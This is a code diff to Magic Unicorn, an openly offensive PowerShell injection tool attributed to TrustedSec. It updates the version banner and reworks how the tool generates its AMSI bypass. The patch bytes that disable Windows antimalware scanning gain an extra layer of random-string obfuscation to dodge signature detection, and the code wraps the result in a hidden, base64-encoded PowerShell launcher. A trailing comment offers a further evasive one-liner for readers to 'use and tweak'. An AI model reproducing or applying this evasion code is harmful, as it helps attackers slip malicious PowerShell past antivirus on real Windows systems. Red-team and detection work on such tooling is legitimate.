@@ -495,7 +495,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.16 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.17 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -1037,9 +1037,11 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         three = "$" + generate_random_string(5,10)
         four = "$" + generate_random_string(5,10)
         five = generate_random_string(5,10)
+        six = generate_random_string(5,10)
         amsi_string = (bypass_amsi()).replace("$kernel32", kernel32).replace("$dll", dll).replace("$amsi", amsi).replace("$scan", scan).replace("$buffer", buffer).replace("$1111", one).replace("$2222", two).replace("$3333", three).replace("$4444", four)
-        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATxB8, GOATxYAWN, GOATxGOATGOAT, GOATxGOAT7, GOATx8GOAT, GOATxC3").replace("YAWN", "57").replace("%s", "MOO");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0").replace("YAWN", five)
+        amsi_string = (amsi_string).replace('%s = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);' % (four), '%s = ("GOATxB8REPLACE, GOATxYAWN, GOATxGOATGOAT, GOATxGOAT7, GOATx8GOAT, GOATxC3").replace("YAWN", "57").replace("%s", "MOO").replace("B8REPLACE", "B8");%s = [Byte[]](%s).split(",");' % (four, mangle_shellcode, four, four)).replace("GOAT", mangle_shellcode).replace("MOO", "0").replace("YAWN", five).replace("B8REPLACE", six)
         amsi_encoded = base64.b64encode(amsi_string.encode('utf_16_le')).decode('ascii')
+        # b8 horse
         full_attack = '''# AMSI bypass code - run in same process as unicorn second stage\npowershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + amsi_encoded + "')" + '"' + "\n\n# actual unicorn payload\n" + full_attack
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
